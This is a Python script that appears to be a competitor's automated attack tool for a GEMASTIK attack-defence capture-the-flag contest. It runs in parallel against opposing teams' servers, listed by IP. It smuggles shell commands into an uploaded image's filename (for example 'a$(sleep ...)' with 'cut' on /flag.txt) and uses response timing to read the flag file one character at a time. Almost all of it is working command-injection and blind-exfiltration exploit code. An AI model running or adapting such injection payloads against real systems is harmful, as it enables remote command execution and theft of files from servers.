#!/usr/bin/env python3
# batch_timing_runner_full_reliable.py
# Run timing-oracle solver across many hosts in parallel.
# Uses threaded per-position probing + two-stage fallback to avoid early termination.
#
# Save and run: python3 batch_timing_runner_full_reliable.py

import sys
import time
import uuid
import statistics
import requests
import re
import concurrent.futures
import copy
import threading
import heapq
from statistics import mean
from datetime import datetime

# ---------------------------- CONFIG ----------------------------
TEAMS = {
    # 'CYH': '47.128.189.162',
    # 'ICC Pisang Molen': '47.130.186.160',
    # 'kessoku no saigo no tatakai': '54.151.174.166',
    # 'PETIR kata ko franz jadi singa': '47.129.232.208',
    # 'HCS infinits park': '18.136.104.104',
    # 'Sampai Jumpa di Gemastik 2026': '3.0.59.42',
    # 'PETIR mencari cici cici daerah': '13.213.66.91',
    # 'fahri bilang nama timnya stigmaboy': '13.215.174.231',
    # 'Pak Rila Maaf Kami Izin Probstat': '13.213.9.98',
    # 'CP Enjoyer': '13.250.110.172',
    # 'ijazahnya mana woy': '52.77.254.10',
    # 'HCS Kos0ng Fans Club': '18.136.203.203',
    # 'Bojangles': '18.142.47.188',
    # # 'Dafi Nafidz Radhiyya': '3.0.95.52',
    # 'HCS maaf ya Azril': '13.215.162.81',
    # 'HowToBeASepuh': '13.229.104.126',
    # 'NullByte Ninjas': '13.229.240.234',
    # 'Ekstrak Daun Bajakah': '13.229.67.66',
    "PKUY cabang siber": "54.169.34.94",
    # 'ICC Whats your ETA Whats your ETA': '47.129.211.16',
}
PORT = 10000

# Credentials used for login
USERNAME = "cin0"
PASSWORD = "cin0"

# Path to flag on target (escaped, no literal '/')
# Change to "\\057app\\057flag.txt" if flag resides under /app/
FLAG_PATH_ESC = "\\057flag.txt"

# Time budget per host in seconds
TIME_BUDGET_SEC = 300  # 5 minutes

# Timing tunables
SLEEP_TIME = 1.5
BASELINE_SAMPLES = 2
SLEEP_TRIES = 2
CANDIDATE_TRIES = 1
REQUIRED_HITS_LOWVAR = 1
REQUIRED_HITS_HIGHVAR = 1
DELAY_BETWEEN = 0.02
MAX_LEN = 300  # safety upper bound; DESIRED_TOTAL_LEN will control actual stopping
HTTP_TIMEOUT = int(SLEEP_TIME + 12)
MAX_WORKERS_PER_POSITION = 8

# Desired length control (set to 76, or 74 if your wrapper is different)
DESIRED_TOTAL_LEN = 76
INNER_LEN = 64
ENFORCE_TOTAL_LEN = True

# Known prefix (time-saver). Set to "" if you don't know it.
KNOWN_PREFIX = "GEMASTIK{"  # change to "" if unsure

# Character buckets (order matters: try '}' first)
CHAR_BUCKETS = [
    "}",
    "0123456789",
    "abcdefghijklmnopqrstuvwxyz",
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
]

RESULT_PATH = "result.txt"
USER_AGENT = "batch-timing-solver/full-reliable/1.0"

# ---------------------------- internals ----------------------------
FLAG_RE_BYTES = re.compile(rb"GEMASTIK\{[^\}\r\n]{1,200}\}")
file_lock = threading.Lock()


# ---------------------------- helpers ----------------------------
def make_session():
    s = requests.Session()
    s.headers.update({"User-Agent": USER_AGENT})
    return s


def create_post_raw(target, filename_header, sess, blob):
    files = {"image": (filename_header, blob, "image/png")}
    t0 = time.perf_counter()
    r = sess.post(
        f"{target}/create",
        data={"title": "t", "content": "c"},
        files=files,
        allow_redirects=True,
        timeout=HTTP_TIMEOUT,
    )
    return r, time.perf_counter() - t0


def payload_unconditional_sleep():
    return f"a$(sleep {SLEEP_TIME}).jpg"


def payload_char(pos, ch):
    return f"a$(v=$(cut -c{pos} $(printf '{FLAG_PATH_ESC}')); [ \"$v\" = '{ch}' ] && sleep {SLEEP_TIME}).jpg"


def register_and_login(target, sess):
    try:
        sess.post(
            f"{target}/register",
            data={"username": USERNAME, "password": PASSWORD},
            allow_redirects=True,
            timeout=HTTP_TIMEOUT,
        )
    except Exception:
        pass
    sess.post(
        f"{target}/login",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=True,
        timeout=HTTP_TIMEOUT,
    )


def seed_upload(target, sess, blob):
    try:
        create_post_raw(target, "seed.png", sess, blob)
    except Exception:
        pass


def baseline_stats(target, sess, blob, n=BASELINE_SAMPLES):
    xs = []
    for _ in range(n):
        _, dt = create_post_raw(target, "seed.png", sess, blob)
        xs.append(dt)
        time.sleep(0.08)
    m = statistics.mean(xs)
    sd = statistics.stdev(xs) if len(xs) > 1 else 0.0
    print(
        f"    baseline: {['{:.3f}'.format(v) for v in xs]} -> mean={m:.3f}s std={sd:.3f}s"
    )
    return m, sd


def measure_sleep_effect(target, sess, blob, n=SLEEP_TRIES):
    xs = []
    for i in range(n):
        _, dt = create_post_raw(target, payload_unconditional_sleep(), sess, blob)
        xs.append(dt)
        print(f"    sleep try {i+1}/{n}: {dt:.3f}s")
        time.sleep(0.08)
    m = statistics.mean(xs)
    sd = statistics.stdev(xs) if len(xs) > 1 else 0.0
    print(f"    sleep mean={m:.3f}s std={sd:.3f}s")
    return m, sd


def calibrate(bm, bsd, sm):
    effect = sm - bm
    thr = bm + max(effect * 0.5, 0.5)
    req = REQUIRED_HITS_LOWVAR if bsd < 0.3 else REQUIRED_HITS_HIGHVAR
    print(
        f"    observed effect={effect:.3f}s -> threshold={thr:.3f}s, required_hits={req}"
    )
    return thr, req, effect


def ordered_charset():
    seen = set()
    out = []
    for bucket in CHAR_BUCKETS:
        for ch in bucket:
            if ch not in seen:
                seen.add(ch)
                out.append(ch)
    return out


def clone_session(sess):
    s = requests.Session()
    s.headers.update(sess.headers)
    s.cookies = copy.copy(sess.cookies)
    return s


# Worker that returns hits/last elapsed (used in stage1)
def worker_probe(target, pos, ch, threshold, blob, cookie_sess):
    s = clone_session(cookie_sess)
    hits = 0
    last = 0.0
    for _ in range(CANDIDATE_TRIES):
        try:
            _, dt = create_post_raw(target, payload_char(pos, ch), s, blob)
        except Exception:
            dt = 0.0
        last = dt
        if dt >= threshold:
            hits += 1
        time.sleep(DELAY_BETWEEN)
    return (ch, hits, CANDIDATE_TRIES, last)


# Worker that returns a vector of samples (used in stage2)
def worker_probe_samples(target, pos, ch, tries, blob, cookie_sess):
    s = clone_session(cookie_sess)
    samples = []
    for _ in range(tries):
        try:
            _, dt = create_post_raw(target, payload_char(pos, ch), s, blob)
        except Exception:
            dt = 0.0
        samples.append(dt)
        time.sleep(DELAY_BETWEEN)
    return ch, samples


# Two-stage threaded guess per position
def guess_position_threaded(target, pos, charset, threshold, required_hits, blob, sess):
    """
    Stage 1: one-pass per candidate in parallel; accept an immediate hit >= threshold.
    Stage 2: if no immediate hit, pick top-K slowest from Stage1 and re-probe them with MORE_TRIES,
             then choose the character with the highest mean elapsed.
    Always returns a character (best-effort).
    """
    n_workers = min(MAX_WORKERS_PER_POSITION, len(charset))
    stage1_results = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=n_workers) as ex:
        futures = {
            ex.submit(worker_probe, target, pos, ch, threshold, blob, sess): ch
            for ch in charset
        }
        for fut in concurrent.futures.as_completed(futures):
            ch, hits, tries, last = fut.result()
            print(
                f"      S1 pos {pos} char {ch!r} -> hits={hits}/{tries} last={last:.3f}s"
            )
            stage1_results.append((ch, hits, last))
            if hits >= required_hits:
                # early accept
                return ch

    if not stage1_results:
        # defensive: return first charset char
        return charset[0] if charset else None

    # Stage 2 fallback: pick top-K slowest by last elapsed
    TOP_K = min(3, len(stage1_results))
    topk = heapq.nlargest(
        TOP_K, stage1_results, key=lambda r: r[2]
    )  # returns tuples (ch,hits,last)

    MORE_TRIES = max(3, CANDIDATE_TRIES + 2)
    re_results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=TOP_K) as ex2:
        futures2 = {
            ex2.submit(
                worker_probe_samples, target, pos, ch, MORE_TRIES, blob, sess
            ): ch
            for ch, _, _ in topk
        }
        for fut in concurrent.futures.as_completed(futures2):
            ch, samples = fut.result()
            m = mean(samples) if samples else 0.0
            print(
                f"      S2 pos {pos} char {ch!r} -> mean={m:.3f}s over {len(samples)} tries"
            )
            re_results.append((ch, m))

    if re_results:
        chosen = max(re_results, key=lambda r: r[1])[0]
        print(f"      >>> fallback chose {chosen!r} by max mean")
        return chosen

    # last resort: pick slowest from stage1
    chosen = max(stage1_results, key=lambda r: r[2])[0]
    print(f"      >>> final-resort choose {chosen!r}")
    return chosen


# Target length computation
def target_total_len(known_prefix):
    if ENFORCE_TOTAL_LEN:
        return DESIRED_TOTAL_LEN
    if known_prefix.startswith("GEMASTIK{"):
        return len(known_prefix) + INNER_LEN + 1
    return MAX_LEN


def is_full_flag(s: str):
    if not s:
        return False
    if s.startswith("GEMASTIK{") and s.endswith("}"):
        return len(s) == DESIRED_TOTAL_LEN
    inner = s
    if s.startswith("GEMASTIK{"):
        inner = inner[len("GEMASTIK{") :]
    if inner.endswith("}"):
        inner = inner[:-1]
    return len(inner) == INNER_LEN


def append_result(team, ip, flag):
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%SZ")
    status = "FULL" if is_full_flag(flag) else "PARTIAL"
    line = f"[{ts}] {team} ({ip}) -> {status}: {flag}\n"
    with file_lock:
        with open(RESULT_PATH, "a", encoding="utf-8") as f:
            f.write(line)
    print("    wrote:", line.strip())


# ---------------------------- per-host solver ----------------------------
def solve_host(team, ip):
    target = f"http://{ip}:{PORT}"
    print(f"[*] {team} @ {target}")
    sess = make_session()

    try:
        with open("sa.jpg", "rb") as f:
            blob = f.read()
    except Exception:
        blob = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"

    try:
        register_and_login(target, sess)
    except Exception as e:
        print(f"    {team}: login/register error: {e}")

    seed_upload(target, sess, blob)

    t_start = time.time()

    try:
        bm, bsd = baseline_stats(target, sess, blob, BASELINE_SAMPLES)
        sm, ssd = measure_sleep_effect(target, sess, blob, SLEEP_TRIES)
        thr, req, effect = calibrate(bm, bsd, sm)
    except Exception as e:
        print(f"    {team}: calibration error: {e}")
        append_result(team, ip, "")
        return

    if effect < 0.5:
        print(f"    {team}: effect too small; skipping.")
        append_result(team, ip, "")
        return

    charset = ordered_charset()
    flag = KNOWN_PREFIX or ""
    start_pos = len(flag) + 1
    total_target = target_total_len(KNOWN_PREFIX)

    for pos in range(start_pos, min(total_target, MAX_LEN) + 1):
        if time.time() - t_start > TIME_BUDGET_SEC:
            print(f"    {team}: time budget reached; stopping.")
            break
        print(f"    {team}: guessing pos {pos} (cur='{flag}')")
        ch = guess_position_threaded(target, pos, charset, thr, req, blob, sess)
        if not ch:
            print(f"    {team}: fallback returned empty; picking first charset char")
            ch = charset[0] if charset else None
            if ch is None:
                break
        flag += ch
        print(f"    {team}: progress: {flag}")
        if ch == "}":
            # If we enforce total length, continue until total_target else stop.
            if ENFORCE_TOTAL_LEN and len(flag) < total_target:
                continue
            break
        # quick completion check
        if (
            flag.startswith("GEMASTIK{")
            and len(flag) >= total_target
            and flag.endswith("}")
        ):
            break

    append_result(team, ip, flag or "")


# ---------------------------- RUN ALL SIMULTANEOUSLY ----------------------------
if __name__ == "__main__":
    print("[*] Launching parallel solver for all teams...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(TEAMS)) as pool:
        futures = {
            pool.submit(solve_host, team, ip): (team, ip) for team, ip in TEAMS.items()
        }
        for fut in concurrent.futures.as_completed(futures):
            team, ip = futures[fut]
            try:
                fut.result()
            except Exception as e:
                print(f"[!] {team} ({ip}) raised: {e}")
                append_result(team, ip, "")
    print("[*] All done.")
